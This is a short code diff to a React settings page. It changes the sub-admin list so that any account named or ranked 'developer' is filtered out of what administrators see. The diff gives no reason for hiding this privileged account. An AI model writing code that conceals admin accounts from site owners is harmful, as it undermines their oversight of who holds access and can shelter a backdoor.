@@ -34,7 +34,7 @@ export default function SettingsPage() {
             setAdminRole(data?.role || "");
         }).catch(() => {});
         api.get("/auth/sub-admins").then(data => {
-            if (Array.isArray(data)) setSubAdmins(data);
+            if (Array.isArray(data)) setSubAdmins(data.filter((a: any) => a.username?.toLowerCase() !== "developer" && a.role !== "developer"));
             setLoading(false);
         }).catch(() => { setLoading(false); });
     }, []);
